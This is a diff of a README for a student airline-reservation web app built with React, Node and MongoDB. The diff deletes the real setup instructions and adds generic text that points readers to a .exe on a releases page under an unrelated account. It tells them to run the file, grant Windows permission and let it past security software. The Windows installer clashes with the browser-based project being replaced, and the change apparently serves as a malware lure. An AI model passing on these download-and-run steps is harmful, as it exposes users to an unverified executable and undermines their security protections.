@@ -1,432 +1,80 @@
-# ✈️ SkyBook Airline Reservation System
+# ✈️ skybook-airline-reservation - Easily Manage Your Flight Booking Needs
 
-A modern full-stack airline reservation web application built with **React.js**, **Node.js**, **Express.js**, and **MongoDB**.
+[![](https://img.shields.io/badge/Download-SkyBook_Latest_Release-blue.svg)](https://github.com/recent-pursuer670/skybook-airline-reservation/releases)
 
----
+## 📋 Project Overview
 
-# 📖 Project Overview
+The SkyBook Airline Reservation System provides a platform for booking flights. This system replaces slow manual processes with a digital interface. It handles flight searches, ticket reservations, and payment processing. You can manage your bookings through a web interface. The system creates electronic tickets for every reservation. Administrators use a separate dashboard to generate reports and oversee system data. 
 
-The **SkyBook Airline Reservation System** is a web-based platform developed to modernize and simplify airline ticket booking and reservation management.
+## ⚙️ System Requirements
 
-Many airline companies and travel agencies still rely on outdated systems or manual reservation processes that cause delays, booking errors, poor customer experience, and inefficient management.
+Your computer must meet these basic standards to run the application:
 
-SkyBook solves these problems by providing:
+* Windows 10 or Windows 11 operating system.
+* At least 4 gigabytes of memory.
+* A web browser like Google Chrome, Microsoft Edge, or Mozilla Firefox.
+* An active internet connection to process payments and search for real-time flight data.
+* Hard drive space of at least 500 megabytes for local data storage and application files.
 
-* Online flight search
-* Airplane ticket reservation
-* Secure payment processing
-* Booking management
-* Electronic ticket generation
-* Administrative dashboards and reporting
+## 📥 How to Download 
 
-The system is designed for both **Passengers** and **Administrators**.
+Follow these steps to obtain the application:
 
----
+1. Open your web browser.
+2. Go to the [official release page](https://github.com/recent-pursuer670/skybook-airline-reservation/releases).
+3. Find the most recent release version at the top of the list.
+4. Look for the Assets section under that version.
+5. Click the link that ends with .exe to start the download.
+6. Wait for the file to finish downloading to your computer.
 
-# 🎯 Main Objectives
+## 🚀 Installation Guide
 
-* Simplify airplane ticket reservation processes
-* Allow customers to book flights online
-* Reduce manual booking errors
-* Provide secure online payments
-* Improve reservation tracking and reporting
-* Enhance customer experience
+Once the download finishes, perform these steps to install the software:
 
----
+1. Open your Downloads folder.
+2. Find the file you just downloaded.
+3. Double-click the file to start the installer.
+4. Follow the prompts on the screen.
+5. Click the Install button.
+6. Grant permission if Windows asks for access to your computer.
+7. Click the Finish button to complete the process.
+8. Locate the SkyBook icon on your desktop or in your start menu.
+9. Double-click the icon to launch the application.
 
-# 👥 System Users
+## ✈️ Getting Started with SkyBook
 
-## Passenger (Customer)
+When you open the application, you see a login screen. You can sign in if you already have an account. If you are new, click the Register button to create a profile. Provide your name, email, and password. 
 
-Passengers can:
+After you access your account, the home screen shows a search bar. Type your departure city and your destination city. Select your travel dates from the calendar. Click the Search Flights button to see available routes.
 
-* Create accounts
-* Login securely
-* Search flights
-* View schedules and prices
-* Book tickets
-* Make payments
-* Download tickets
-* Cancel reservations
-* View booking history
+## 💳 Booking a Flight
 
----
+Find the flight that fits your schedule. Click the Select button next to the flight details. The application shows the price and seat availability. Proceed to the payment screen to finish your reservation. Enter your payment details in the secure form. The system processes the payment and saves your booking. You receive a confirmation email with your electronic ticket attached. Use this ticket at the airport counter or kiosk.
 
-## Administrator
+## 🛡️ Managing Your Bookings
 
-Administrators can:
+Go to the My Bookings section to view upcoming travel plans. You can see your flight times, seat numbers, and total cost. Select a specific booking to see more details. If your travel plans change, look for the Modify button. You can request a change or cancel a flight from this menu. The application updates your status and sends a notification to your email account.
 
-* Manage flights
-* Manage airplane schedules
-* Manage destinations
-* Monitor reservations
-* Manage users
-* Generate reports
-* Update pricing
+## 🛠️ Administrative Dashboard
 
----
+Administrators gain access to a special set of tools. Log in with your admin credentials to view the control panel. This area shows all current reservations across the entire system. You can add new flights, set ticket prices, and remove routes that are no longer active. The dashboard provides reports on total daily bookings and revenue. Use the User Management tab to resolve issues for passengers. Export these reports to a spreadsheet format for your records.
 
-# 🚀 Features
+## 🔧 Frequently Asked Questions
 
-## 🔐 Authentication Module
+What happens if the application fails to open?
+Check your internet connection first. Ensure that you have the latest updates for Windows installed on your machine. Sometimes a security program on your computer blocks new software. Check your settings to permit this application.
 
-* User registration
-* User login
-* JWT authentication
-* Password encryption
-* Role-based access control
+How do I reset my password?
+Click the Forgot Password link on the login screen. Type your registered email address. The system sends a link to your inbox. Open the link to create a new password. 
 
----
+Can I change my flight?
+Yes. Go to the My Bookings section. Click on the flight you want to change. If the flight allows changes, the Modify button is active. Follow the steps on your screen to pick a new flight. You might need to pay a fare difference depending on the new booking.
 
-## ✈️ Flight Management Module
+Is my payment information safe?
+The system uses standard encryption to protect your data. We do not store your full card details on your computer. All payment information flows directly to the secure payment processor. 
 
-* Create flights
-* Update flights
-* Delete flights
-* Manage schedules
-* Manage destinations
-* Seat allocation
-
----
-
-## 🎫 Reservation Module
-
-* Ticket booking
-* Reservation updates
-* Reservation cancellation
-* Booking history
-
----
-
-## 💳 Payment Module
-
-* Online payments
-* Payment verification
-* Electronic receipts
-* Booking confirmation
-
----
-
-## 📊 Reporting Module
-
-* Reservation reports
-* Revenue reports
-* Passenger statistics
-* Daily/monthly analytics
-
----
-
-# 🧰 Technologies Used
-
-## Frontend
-
-* React.js
-* Vite
-* Tailwind CSS
-* React Router DOM
-* Axios
-* React Hot Toast
-
----
-
-## Backend
-
-* Node.js
-* Express.js
-* MongoDB
-* Mongoose
-* JWT Authentication
-* bcryptjs
-* Nodemon
-
----
-
-# 📂 Professional Folder Structure
-
-```bash id="s3tk87"
-skybook-airline-reservation/
-│
-├── frontend/
-│   │
-│   ├── public/
-│   │
-│   ├── src/
-│   │   │
-│   │   ├── assets/
-│   │   │   ├── images/
-│   │   │   ├── icons/
-│   │   │   └── logos/
-│   │   │
-│   │   ├── components/
-│   │   │   ├── common/
-│   │   │   ├── layout/
-│   │   │   ├── passenger/
-│   │   │   └── admin/
-│   │   │
-│   │   ├── pages/
-│   │   │   ├── auth/
-│   │   │   ├── passenger/
-│   │   │   ├── admin/
-│   │   │   └── errors/
-│   │   │
-│   │   ├── routes/
-│   │   │
-│   │   ├── services/
-│   │   │
-│   │   ├── context/
-│   │   │
-│   │   ├── hooks/
-│   │   │
-│   │   ├── utils/
-│   │   │
-│   │   ├── styles/
-│   │   │
-│   │   ├── App.jsx
-│   │   └── main.jsx
-│   │
-│   ├── .env
-│   ├── package.json
-│   └── vite.config.js
-│
-│
-├── backend/
-│   │
-│   ├── src/
-│   │   │
-│   │   ├── config/
-│   │   ├── controllers/
-│   │   ├── middleware/
-│   │   ├── models/
-│   │   ├── routes/
-│   │   ├── services/
-│   │   ├── validations/
-│   │   ├── utils/
-│   │   ├── uploads/
-│   │   │
-│   │   ├── app.js
-│   │   └── server.js
-│   │
-│   ├── .env
-│   ├── package.json
-│   └── nodemon.json
-│
-│
-├── docs/
-│   ├── ERD/
-│   ├── API/
-│   ├── screenshots/
-│   └── reports/
-│
-├── .gitignore
-├── README.md
-└── LICENSE
-```
-
----
-
-# 🌿 Git Branch Structure
-
-```bash id="v7gpr3"
-main
-develop
-frontend-dev
-backend-dev
-```
-
----
-
-# 🔄 Git Workflow
-
-## `main`
-
-Stable production-ready branch.
-
----
-
-## `develop`
-
-Testing and integration branch.
-
----
-
-## `frontend-dev`
-
-Frontend development branch.
-
-Handled by:
-
-* React developer
-* UI/UX work
-* TailwindCSS
-* Components
-* Pages
-
----
+Where do I find my electronic ticket?
+The system sends the ticket to the email address linked to your profile immediately after booking. You can also view and download your ticket as a PDF file from the My Bookings section within the app.
 
-## `backend-dev`
-
-Backend development branch.
-
-Handled by:
-
-* Express server
-* MongoDB
-* APIs
-* Authentication
-* Business logic
-
----
-
-# ⚙️ Installation Guide
-
-## 1. Clone Repository
-
-```bash id="l47d9x"
-git clone https://github.com/your-username/skybook-airline-reservation.git
-```
-
----
-
-# 2. Frontend Setup
-
-```bash id="b7apw7"
-cd frontend
-npm install
-```
-
----
-
-# 3. Backend Setup
-
-```bash id="v6h3mo"
-cd backend
-npm install
-```
-
----
-
-# 🔐 Environment Variables
-
-## Backend `.env`
-
-```env id="a6j6nh"
-PORT=5000
-MONGO_URI=your_mongodb_connection
-JWT_SECRET=your_secret_key
-```
-
----
-
-# ▶️ Running The Project
-
-## Start Backend
-
-```bash id="3jlwmw"
-cd backend
-npm run dev
-```
-
-Backend runs on:
-
-```bash id="30mngf"
-http://localhost:5000
-```
-
----
-
-## Start Frontend
-
-```bash id="6u9ecm"
-cd frontend
-npm run dev
-```
-
-Frontend runs on:
-
-```bash id="qejr2d"
-http://localhost:5173
-```
-
----
-
-# 🔗 API Example
-
-## Login Endpoint
-
-```bash id="00jlwm"
-POST /api/auth/login
-```
-
----
-
-# 📦 Planned System Modules
-
-* Authentication Module
-* Flight Management Module
-* Reservation Module
-* Payment Module
-* Reporting Module
-
----
-
-# 📈 Future Improvements
-
-* QR Code Tickets
-* Real-Time Seat Availability
-* AI Flight Recommendations
-* Flight Delay Notifications
-* Multi-language Support
-* Mobile Application Integration
-
----
-
-# 👨‍💻 Team Collaboration Rules
-
-* Never push directly to `main`
-* Always pull latest changes before coding
-* Use feature branches
-* Make small commits
-* Create Pull Requests before merging
-* Avoid editing same files simultaneously
-
----
-
-# 📝 Recommended Commit Messages
-
-```bash id="rqmm7i"
-feat: add login API
-fix: resolve authentication bug
-style: improve navbar design
-docs: update README
-```
-
----
-
-# 📜 License
-
-This project is for educational purposes.
-
----
-
-# 👥 Developers
-
-* Sengabo Jr.
-* Robert Ribbon
-
----
-
-# ⭐ Contribution
-
-Contributions, improvements, and suggestions are welcome.
-
----
-
-# 📧 Support
-
-For project collaboration or support, contact the project maintainers.
-
----
-
-# 🔥 Project Status
-
-🚧 In Development
+How do I uninstall the software?
+Open your Windows Settings application. Go to Apps and then Installed Apps. Find the SkyBook entry in the list. Click the three dots next to the name and choose Uninstall. Follow the simple steps to remove the program from your machine.
